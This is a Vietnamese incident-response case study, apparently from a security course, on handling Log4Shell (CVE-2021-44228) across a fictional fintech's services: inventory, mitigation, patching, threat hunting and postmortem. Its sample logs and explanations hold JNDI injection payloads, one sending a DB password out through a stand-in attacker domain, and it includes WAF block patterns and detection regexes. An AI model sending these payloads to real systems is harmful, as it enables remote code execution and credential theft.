# Case 18 — Ứng phó Log4Shell (CVE-2021-44228) trên hàng chục service: phân loại, giảm thiểu, vá, săn dấu vết và phòng ngừa chuỗi cung ứng

> **Chủ đề:** Zero-day trong dependency, incident response, SBOM/SCA, mitigation flag, override version trong Maven/Gradle, WAF, egress filtering, threat hunting, postmortem
> **Module liên quan:** [M16 §10 — OWASP Top 10, case Log4Shell](../01-giao-trinh/16-devops-build-cloud-security.md#p10) · [M16 §11 — Supply chain, SCA, SBOM, secrets](../01-giao-trinh/16-devops-build-cloud-security.md#p11) · [M16 §12 — Xử lý sự cố & postmortem](../01-giao-trinh/16-devops-build-cloud-security.md#p12) · [M16 §1 — Maven: dependency mediation, BOM](../01-giao-trinh/16-devops-build-cloud-security.md#p1) · [M16 §2 — Gradle](../01-giao-trinh/16-devops-build-cloud-security.md#p2) · [M16 §8 — Pipeline CI/CD](../01-giao-trinh/16-devops-build-cloud-security.md#p8) · [M16 §7 — Kubernetes](../01-giao-trinh/16-devops-build-cloud-security.md#p7) · [M10 §8 — Bảo mật Struts (so sánh)](../01-giao-trinh/10-struts.md#8-security)
> **Độ khó:** ⭐⭐⭐⭐ (Senior)
> **Thời gian tự giải gợi ý:** 45 phút

---

## 1. Bối cảnh hệ thống

Công ty fintech (minh họa) — thời điểm: **thứ Sáu 10/12/2021**.

| Nhóm hệ thống | Số lượng | Công nghệ |
|---|---|---|
| Microservices trên Kubernetes | 64 | Spring Boot 2.3–2.5, Java 11/17; phần lớn dùng Logback mặc định |
| Ứng dụng legacy | 11 | WAR trên Tomcat 8/WebLogic 12c, Java 8, một số dùng log4j 2.x trực tiếp |
| Phần mềm bên thứ ba tự vận hành | 9 | Elasticsearch + Logstash (log tập trung), Kafka, Jenkins, SonarQube, một sản phẩm core-banking của vendor |
| Thiết bị/SaaS | nhiều | WAF, VPN, IAM SaaS… |

```
Internet ─► CDN/WAF ─► Ingress ─► 64 service (K8s, egress NetworkPolicy default-deny đã áp cho 2/3 namespace)
        └─► DMZ: 4 ứng dụng legacy (VM, outbound mở rộng do "lịch sử")
Log của mọi thứ ─► Logstash ─► Elasticsearch
```

Không có SBOM tập trung; có OWASP Dependency-Check trong CI cho khoảng 40% repository, chạy báo cáo nhưng không chặn build.

---

## 2. Triệu chứng

```
10/12 07:30  Feed CERT/vendor: "Critical RCE in Apache Log4j 2 (CVSS 10), PoC công khai"
10/12 09:05  WAF: request có "${jndi:ldap://" trong User-Agent, X-Api-Version, Referer — 1.200 req/phút, tăng dần
10/12 10:40  DNS resolver nội bộ log: truy vấn tới <chuỗi-ngẫu-nhiên>.oast.example từ 3 host DMZ
10/12 11:42  Firewall: host legacy-claims-01 (DMZ) mở kết nối TCP tới 203.0.113.45:1389
10/12 11:42  Proxy outbound: legacy-claims-01 GET http://203.0.113.45:8000/Exploit.class  200
10/12 12:15  Giám sát CPU: legacy-claims-01 CPU 100% liên tục, tiến trình lạ /tmp/.cache/kworkerd
```

Ví dụ log truy cập:

```
198.51.100.23 - - [10/Dec/2021:09:05:11 +0700] "GET /api/v1/rates HTTP/1.1" 200 412 "-" "${jndi:ldap://198.51.100.23:1389/a}"
192.0.2.77   - - [10/Dec/2021:10:12:40 +0700] "POST /login HTTP/1.1" 401 88 "-" "${${lower:j}${::-n}di:${lower:l}dap://x.oast.example/${env:HOSTNAME}}"
```

---

## 3. Câu hỏi đặt ra

1. Trong **2 giờ đầu**, bạn làm gì và theo thứ tự nào? Ai làm gì?
2. Làm sao biết **chính xác** service nào bị ảnh hưởng, gồm cả dependency transitive, fat jar, image bên thứ ba?
3. Có những biện pháp giảm thiểu nào trước khi kịp vá, và mỗi biện pháp hở ở đâu?
4. Vá thế nào trên Maven/Gradle/Spring Boot cho nhanh và đúng?
5. Làm sao xác định hệ thống **đã bị khai thác** hay chưa, và nếu có thì xử lý ra sao?
6. Sau sự cố, thay đổi gì để lần sau trả lời câu 2 trong vài phút?

> ✋ **Dừng lại và tự giải trước.** Viết kế hoạch 24 giờ đầu theo các mốc 0–2 h, 2–8 h, 8–24 h.

---

## 4. Điều tra từng bước

### Bước 1 — Kích hoạt incident và phân vai (T+0, 07:45)

SEV1 bảo mật. Incident Commander (trưởng nhóm platform), Security lead (săn dấu vết), các "owner" của từng nhóm hệ thống, Communications lead (báo ban điều hành, chuẩn bị thông báo cho cơ quan quản lý nếu có rò rỉ dữ liệu), Scribe ghi timeline. Kênh chat riêng, cập nhật mỗi 30 phút.

### Bước 2 — Hiểu cơ chế để biết tìm gì

- Lỗ hổng nằm trong **`log4j-core`** 2.0-beta9 → 2.14.1: message lookup `${jndi:...}` trong **nội dung log** được diễn giải → JNDI tới LDAP/RMI của kẻ tấn công → tải và thực thi class từ xa.
- **Không** bị ảnh hưởng bởi CVE này: `log4j-api` đứng một mình, `log4j-to-slf4j` (cầu nối sang Logback), Logback, log4j 1.x (EOL, có CVE khác như CVE-2021-4104 với `JMSAppender` khi cấu hình).
- Chỉ cần ứng dụng **log** một chuỗi do người dùng kiểm soát (header, username, field form…).
- JDK mới (8u191+, 11.0.1+) mặc định `com.sun.jndi.ldap.object.trustURLCodebase=false` chặn tải class từ xa qua LDAP — **nhưng** vẫn có thể bị khai thác qua gadget deserialization có sẵn trên classpath, và vẫn **rò rỉ dữ liệu qua DNS** (`${jndi:ldap://${env:DB_PASSWORD}.attacker.example/a}`).

### Bước 3 — Kiểm kê: ai đang dùng `log4j-core`, phiên bản nào (T+0:30 → T+30h)

**Từ mã nguồn (nhanh nhưng không đủ):**

```bash
# Maven — chạy hàng loạt trên mọi repo đã clone
mvn -q dependency:tree -Dincludes=org.apache.logging.log4j:log4j-core
# [INFO] com.fin:payment-gateway:jar:3.4.1
# [INFO] \- org.springframework.boot:spring-boot-starter-log4j2:jar:2.4.5:compile
# [INFO]    \- org.apache.logging.log4j:log4j-core:jar:2.13.3:compile

# Gradle
./gradlew -q dependencyInsight --dependency log4j-core --configuration runtimeClasspath
```

**Từ artifact/image đang chạy (nguồn sự thật):**

```bash
# Liệt kê image đang chạy thực tế
kubectl get pods -A -o jsonpath='{range .items[*]}{.spec.containers[*].image}{"\n"}{end}' | sort -u > images.txt

# Sinh SBOM và quét
while read img; do
  syft "$img" -o cyclonedx-json > "sbom/$(echo $img | tr '/:' '__').json"
  grype "sbom:sbom/$(echo $img | tr '/:' '__').json" --only-fixed -q | grep -i log4j
done < images.txt

# VM legacy: fat jar / WAR lồng nhau, jar bị shade (đổi package) → tìm theo class, không chỉ theo tên file
find / -xdev \( -name '*.jar' -o -name '*.war' -o -name '*.ear' \) 2>/dev/null \
  | while read f; do unzip -l "$f" 2>/dev/null | grep -q 'JndiLookup.class' && echo "$f"; done
```

Các thư viện bị **shade** (đổi tên package, ví dụ nhúng trong SDK của vendor) không lộ ra bằng tên `log4j-core-*.jar`, nên quét theo nội dung class (`JndiLookup.class`) hoặc dùng scanner chuyên dụng đọc được archive lồng nhau.

Kết quả kiểm kê (sau 30 giờ — chậm nhất là phần legacy và vendor):

| Nhóm | Bị ảnh hưởng | Ghi chú |
|---|---|---|
| 64 service Boot | **9** dùng `spring-boot-starter-log4j2` (log4j-core 2.13–2.14) | 55 service dùng Logback: chỉ có `log4j-api`/`log4j-to-slf4j` → không bị ảnh hưởng, dù scanner theo tên báo động |
| 11 legacy | **5** (log4j-core 2.8–2.14), 4 dùng log4j 1.2.17, 2 dùng Logback | 1 trong 5 là `legacy-claims-01` ở DMZ, Java 8u151 (cũ hơn 8u191) |
| Vendor | Logstash (bị), Elasticsearch (vendor đánh giá: RCE bị Security Manager chặn, có thể rò rỉ qua DNS), core-banking (chờ vendor xác nhận) | Phụ thuộc lịch vá của vendor |

### Bước 4 — Phân loại ưu tiên

| Ưu tiên | Tiêu chí | Hệ thống |
|---|---|---|
| P0 | Bị ảnh hưởng **và** nhận input từ Internet **và** egress ra ngoài được | 4 legacy DMZ, 2 service Boot ở namespace chưa có egress policy |
| P1 | Bị ảnh hưởng, nội bộ nhưng log dữ liệu từ nguồn bên ngoài (ví dụ Logstash nhận log chứa payload!) | Logstash, 7 service Boot còn lại |
| P2 | log4j 1.x (EOL, CVE khác) | 4 legacy — track riêng, kế hoạch nâng cấp |

Một điểm hay bị quên: **hệ thống log tập trung** cũng bị tấn công gián tiếp — payload trong User-Agent được service Logback ghi lại an toàn, nhưng khi Logstash (log4j 2) xử lý và log lại thì có thể kích hoạt lookup.

### Bước 5 — Săn dấu vết khai thác (song song với vá)

```bash
# Payload trong log truy cập/ứng dụng, gồm cả dạng obfuscate và URL-encode
zgrep -E -i '\$\{(jndi|\$\{|lower:|upper:|::-|env:|sys:)|%24%7B(jndi|%24%7B)' /var/log/nginx/access.log* | wc -l

# Bằng chứng lookup THỰC SỰ xảy ra (quan trọng hơn việc có payload):
# 1) Kết nối outbound từ host ứng dụng tới cổng LDAP/RMI lạ (firewall/flow log)
# 2) DNS query từ host ứng dụng tới domain lạ (log resolver)
# 3) Proxy log: tải file .class
# 4) Tiến trình con của JVM, file lạ, cron mới
ps -ef --forest | grep -A3 '[j]ava'
find /tmp /var/tmp /dev/shm -newer /etc/hostname -type f 2>/dev/null
crontab -l -u tomcat; ls -la /etc/cron.d
```

Kết luận săn dấu vết:

- **legacy-claims-01: bị khai thác thành công.** Chuỗi bằng chứng: request có payload 11:41:58 → kết nối LDAP ra 203.0.113.45:1389 → tải `Exploit.class` → tiến trình con `sh -c curl ... | sh` của user `tomcat` → miner `/tmp/.cache/kworkerd`. Không thấy dấu hiệu di chuyển ngang (host nằm DMZ, không có route vào mạng DB lõi), nhưng biến môi trường chứa credential DB của chính ứng dụng.
- 3 host DMZ khác: có DNS lookup ra ngoài (lookup đã xảy ra) nhưng kết nối LDAP bị firewall chặn → **rò rỉ hostname/biến môi trường qua DNS là có thể**, không thấy RCE.
- 64 service K8s: các namespace có egress default-deny chặn mọi kết nối ra; 2 service ở namespace chưa có policy có DNS lookup ra ngoài.

---

## 5. Nguyên nhân gốc

**Kỹ thuật:** `log4j-core` (2.0-beta9–2.14.1) diễn giải lookup trong nội dung message; JNDI cho phép tải và thực thi code từ xa; ứng dụng log dữ liệu không tin cậy. Host bị khai thác chạy JDK cũ (cho phép remote codebase) và có outbound mở.

**Tổ chức/quy trình (nguyên nhân khiến tác động lớn và phản ứng chậm):**

1. Không có **SBOM tập trung** → mất 30 giờ để trả lời "ai dùng log4j-core, phiên bản nào".
2. **Egress không default-deny** ở DMZ và một phần cluster.
3. Ứng dụng legacy không có owner rõ ràng, build thủ công → vá chậm nhất.
4. Credential nằm trong biến môi trường dài hạn, không rotate tự động.
5. Không có runbook "zero-day trong thư viện phổ biến".

---

## 6. Giải pháp

### 6.1 Giảm thiểu ngay (giờ 0–8), theo thứ tự chi phí thấp → cao

| Biện pháp | Cách làm | Hở ở đâu |
|---|---|---|
| WAF rule (virtual patch) | Chặn `${jndi:`, `${${`, `${lower:`, `${::-`, `%24%7B` ở header/body/URL | Obfuscation vô hạn; payload có thể đến qua kênh không đi qua WAF (email, Kafka, file import) |
| Chặn egress | NetworkPolicy default-deny cho namespace còn thiếu; firewall chặn outbound 389/636/1389/1099 và mọi outbound không cần thiết từ DMZ | Rò rỉ qua DNS vẫn có thể nếu resolver nội bộ forward ra ngoài → sinkhole/giới hạn DNS ra Internet |
| Tắt lookup bằng cấu hình | `LOG4J_FORMAT_MSG_NO_LOOKUPS=true` hoặc `-Dlog4j2.formatMsgNoLookups=true` (chỉ hiệu lực từ 2.10) — rollout qua env của Deployment, không cần build | Không đủ cho mọi cấu hình (CVE-2021-45046: pattern dùng Context Lookup `${ctx:...}` hoặc `%X/%mdc` với dữ liệu do kẻ tấn công kiểm soát); không áp dụng cho < 2.10 |
| Gỡ class `JndiLookup` | `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class` | Phải sửa artifact (fat jar cần đóng gói lại); dễ bị ghi đè khi deploy lại bản cũ |
| Cô lập host bị xâm nhập | Ngắt mạng `legacy-claims-01`, chụp disk/memory để điều tra, **dựng lại từ image sạch**, không "dọn" tại chỗ | — |
| Rotate secret | Mọi credential trong env/config của host bị ảnh hưởng **có thể đã rò qua DNS**: DB password, API key, token | Tốn công nếu không có secret manager |

```yaml
# Ví dụ rollout flag cho 9 service Boot trong vòng 1 giờ, không cần build
env:
  - name: LOG4J_FORMAT_MSG_NO_LOOKUPS
    value: "true"
```

### 6.2 Vá (giờ 2 → ngày 18)

Bản vá thay đổi nhiều lần: 2.15.0 (ngày công bố) → 2.16.0 (tắt JNDI mặc định, gỡ message lookup; xử lý CVE-2021-45046) → 2.17.0 (DoS do lookup đệ quy, CVE-2021-45105) → 2.17.1 (CVE-2021-44832). Với Java 7 có nhánh 2.12.x, Java 6 có 2.3.x. Đội phải deploy **ba lần trong hai tuần** — pipeline tự động là yếu tố quyết định.

**Spring Boot (Maven, dùng `spring-boot-starter-parent`):** override property mà BOM của Boot dùng:

```xml
<properties>
  <log4j2.version>2.17.1</log4j2.version>
</properties>
```

**Spring Boot import BOM qua `dependencyManagement` (không dùng parent):** property không có tác dụng với BOM được import → import `log4j-bom` **trước** BOM của Boot (khai báo trước thắng):

```xml
<dependencyManagement>
  <dependencies>
    <dependency>
      <groupId>org.apache.logging.log4j</groupId>
      <artifactId>log4j-bom</artifactId>
      <version>2.17.1</version>
      <type>pom</type><scope>import</scope>
    </dependency>
    <dependency>
      <groupId>org.springframework.boot</groupId>
      <artifactId>spring-boot-dependencies</artifactId>
      <version>${spring-boot.version}</version>
      <type>pom</type><scope>import</scope>
    </dependency>
  </dependencies>
</dependencyManagement>
```

**Gradle** (plugin `io.spring.dependency-management`): `ext['log4j2.version'] = '2.17.1'`; Gradle thuần: constraint

```groovy
dependencies {
    constraints {
        implementation('org.apache.logging.log4j:log4j-core') {
            version { require '2.17.1' }
            because 'CVE-2021-44228, CVE-2021-45046, CVE-2021-45105, CVE-2021-44832'
        }
    }
}
```

**Kiểm tra sau vá — trên artifact, không chỉ trên pom:**

```bash
unzip -l target/app.jar | grep log4j-core        # BOOT-INF/lib/log4j-core-2.17.1.jar
trivy image --severity CRITICAL registry.local/payment-gateway:3.4.2
```

**CI gate tạm thời** cho mọi repo: build fail nếu phát hiện `log4j-core` < 2.17.1 (Maven Enforcer `bannedDependencies`):

```xml
<plugin>
  <groupId>org.apache.maven.plugins</groupId>
  <artifactId>maven-enforcer-plugin</artifactId>
  <executions><execution><id>ban-vulnerable-log4j</id><goals><goal>enforce</goal></goals>
    <configuration><rules><bannedDependencies>
      <excludes><exclude>org.apache.logging.log4j:log4j-core:(,2.17.1)</exclude></excludes>
    </bannedDependencies></rules></configuration>
  </execution></executions>
</plugin>
```

**Legacy & vendor:** WAR legacy thay jar trong `WEB-INF/lib` + build lại bằng Maven (nhân dịp chuyển khỏi build thủ công); Logstash/Elasticsearch nâng theo advisory của vendor; core-banking: áp mitigation của vendor + cô lập mạng chặt hơn cho tới khi có bản vá.

### 6.3 So sánh chiến lược

| Chiến lược | Tốc độ | Độ bao phủ | Rủi ro |
|---|---|---|---|
| Chỉ WAF | Phút | Thấp | Cảm giác an toàn giả |
| Flag `formatMsgNoLookups` | Giờ | Trung bình | Không đủ cho mọi cấu hình, không cho < 2.10 |
| Gỡ `JndiLookup.class` | Giờ | Cao cho JNDI | Thao tác artifact thủ công, dễ hồi quy |
| Nâng version | Giờ–ngày | Cao nhất | Cần build/test/deploy cho mỗi service; patch đổi nhiều lần |
| Egress default-deny | Giờ (nếu đã có sẵn khung) | Chặn chuỗi khai thác RCE cho **mọi** lỗ hổng tương tự | Phải biết luồng outbound hợp lệ |

Đúng cách là **chồng nhiều lớp**: WAF + egress + flag trong giờ đầu, vá version trong ngày, rồi săn dấu vết và rotate secret.

---

## 7. Phòng ngừa

**Biết mình đang chạy gì (mục tiêu: trả lời trong 15 phút)**

- Sinh SBOM CycloneDX cho mọi build (`cyclonedx-maven-plugin` goal `makeAggregateBom`, `syft` cho image), đẩy vào **Dependency-Track**; truy vấn "component X phiên bản Y đang chạy ở đâu" từ một nơi.
- Danh mục service có **owner**, môi trường, có tiếp xúc Internet hay không; danh mục phần mềm vendor kèm phiên bản.

**Vá nhanh**

- Renovate/Dependabot cho mọi repo, gom nhóm PR; SCA chặn build với Critical có bản vá (`failBuildOnCVSS`), suppression phải có hạn và lý do.
- Mục tiêu: rebuild + redeploy toàn bộ fleet trong < 4 giờ; ứng dụng legacy được đưa vào pipeline chuẩn.
- SLA vá: Critical khai thác ngoài thực tế (CISA KEV) 24–72 giờ.

**Phòng thủ nhiều lớp**

- Egress default-deny ở mọi namespace/VM; DNS ra Internet chỉ qua resolver có log và chính sách.
- JDK cập nhật định kỳ qua base image chuẩn (golden image), rebuild hằng tuần.
- Runtime detection (ví dụ Falco/EDR): cảnh báo khi JVM sinh tiến trình shell, kết nối tới cổng lạ.
- Secret ở secret manager, rotate tự động, credential ngắn hạn (workload identity).
- Không log nguyên dữ liệu do người dùng kiểm soát ở mức INFO; sanitize/giới hạn độ dài trường log.

**Quy trình**

- Runbook "zero-day thư viện phổ biến" với vai trò, lệnh kiểm kê, thứ tự giảm thiểu, mẫu thông báo; diễn tập tabletop mỗi 6 tháng.
- Postmortem blameless với action item có owner và hạn:

| Action item | Owner | Hạn |
|---|---|---|
| SBOM + Dependency-Track cho 100% artifact | Platform | 6 tuần |
| Egress default-deny toàn bộ cluster + DMZ | Network/Platform | 4 tuần |
| Đưa 11 app legacy vào pipeline Maven + SCA | Squad legacy | 3 tháng |
| Chuyển secret sang Vault, rotate tự động | Security | 2 tháng |
| Kế hoạch loại bỏ log4j 1.x | Squad legacy | 6 tháng |

---

## 8. Cách kể lại trong phỏng vấn (STAR)

- **Situation:** "Ngày Log4Shell công bố, công ty mình có 64 service Spring Boot, 11 ứng dụng legacy và nhiều phần mềm vendor. Không có SBOM tập trung; sau vài giờ đã thấy request quét payload `${jndi:` trên WAF."
- **Task:** "Mình là một trong hai người điều phối kỹ thuật: kiểm kê, giảm thiểu, vá và xác định có bị xâm nhập hay không."
- **Action:** "Mình chia làm ba luồng song song. Giảm thiểu: WAF rule, siết egress, bật `formatMsgNoLookups` qua env cho các service dùng log4j2 trong một giờ, gỡ `JndiLookup` cho bản cũ. Kiểm kê: thay vì chỉ đọc pom, mình sinh SBOM từ image đang chạy bằng syft/grype và quét class trong archive lồng nhau trên VM — nhờ vậy loại được 55 service chỉ có `log4j-api` khỏi danh sách hoảng loạn và tìm ra jar bị shade trong SDK vendor. Săn dấu vết: tìm bằng chứng lookup thực sự — DNS, kết nối LDAP ra ngoài, tải `.class`, tiến trình con của JVM — và phát hiện một host DMZ bị khai thác, cô lập, dựng lại từ image sạch, rotate toàn bộ secret liên quan. Vá theo ba vòng 2.15 → 2.16 → 2.17.1 qua override `log4j2.version` và Enforcer rule chặn bản lỗi."
- **Result:** "Mọi hệ thống P0 được giảm thiểu trong 6 giờ, vá xong 100% trong 18 ngày; thiệt hại giới hạn ở một host DMZ chạy miner, không có dữ liệu khách hàng bị truy cập. Sau đó mình dẫn việc đưa SBOM và Dependency-Track vào pipeline; lần CVE lớn tiếp theo, câu hỏi 'ai bị ảnh hưởng' được trả lời trong 10 phút."

---

## 9. Câu hỏi mở rộng

<details>
<summary>1. Ứng dụng Spring Boot mặc định có bị Log4Shell không?</summary>

Không trực tiếp: Boot mặc định dùng Logback; `log4j-api` và `log4j-to-slf4j` có trên classpath nhưng không chứa code lookup bị lỗi. Chỉ bị khi dùng `spring-boot-starter-log4j2` (có `log4j-core`) hoặc một dependency khác kéo `log4j-core` vào. Scanner so khớp theo tên "log4j" dễ báo động giả — phải nhìn đúng artifact `log4j-core` và phiên bản.
</details>

<details>
<summary>2. JDK mới đã chặn `trustURLCodebase` thì còn nguy hiểm không?</summary>

Còn. (1) Rò rỉ dữ liệu qua DNS bằng lookup lồng nhau (`${env:...}`, `${sys:...}`) không cần tải class. (2) Server LDAP độc hại có thể trả về object serialize hoặc reference dùng factory có sẵn trên classpath (ví dụ gadget trong Tomcat như `BeanFactory`) để thực thi code mà không cần remote codebase. Nâng JDK giảm rủi ro nhưng không thay thế được việc vá.
</details>

<details>
<summary>3. Vì sao Logstash/hệ thống log tập trung cũng phải xử lý gấp dù service của mình dùng Logback?</summary>

Payload đi theo dữ liệu: service an toàn ghi User-Agent độc hại vào log, log được chuyển tới Logstash; nếu Logstash (dùng log4j 2) log lại nội dung đó trong quá trình xử lý thì lookup có thể bị kích hoạt **bên trong hạ tầng log**, vốn thường có quyền truy cập rộng. Đánh giá phải theo luồng dữ liệu, không chỉ theo điểm vào Internet.
</details>

<details>
<summary>4. Làm sao chứng minh "chưa bị khai thác" với ban điều hành?</summary>

Không thể chứng minh tuyệt đối; chỉ đưa ra mức độ tin cậy dựa trên bằng chứng: không có kết nối outbound LDAP/RMI/HTTP tải class từ host bị ảnh hưởng (flow log, proxy log, firewall), không có DNS lookup bất thường, không có tiến trình/file/cron lạ, không có truy cập dữ liệu bất thường trong audit DB. Nói rõ giới hạn (log giữ bao lâu, khoảng mù) và các biện pháp bù (rotate secret, tăng giám sát 30 ngày).
</details>

<details>
<summary>5. So sánh Log4Shell với Spring4Shell (CVE-2022-22965) về cách ứng phó.</summary>

Spring4Shell cần điều kiện cụ thể (JDK 9+, deploy WAR trên Tomcat, endpoint data binding vào POJO) nên phạm vi hẹp hơn; jar thực thi của Spring Boot không thuộc trường hợp khai thác được công bố. Quy trình ứng phó giống nhau: kiểm kê qua SBOM, đánh giá điều kiện khai thác thực tế, giảm thiểu (`@InitBinder` `setDisallowedFields("class.*", "Class.*", "*.class.*", "*.Class.*")`), nâng Spring Framework 5.3.18+/5.2.20+ hoặc Boot 2.6.6+/2.5.12+.
</details>

<details>
<summary>6. Một hệ thống vendor chưa có bản vá — bạn làm gì?</summary>

Áp mitigation vendor khuyến nghị (flag, gỡ class nếu vendor cho phép), cô lập mạng (chỉ cho phép luồng cần thiết, chặn egress), đặt WAF/reverse proxy phía trước nếu có giao diện web, tăng giám sát (tiến trình, kết nối), ghi nhận rủi ro được chấp nhận (risk acceptance) có thời hạn và người phê duyệt, theo dõi advisory của vendor hằng ngày. Về lâu dài, đưa yêu cầu SBOM và SLA vá vào hợp đồng với vendor.
</details>
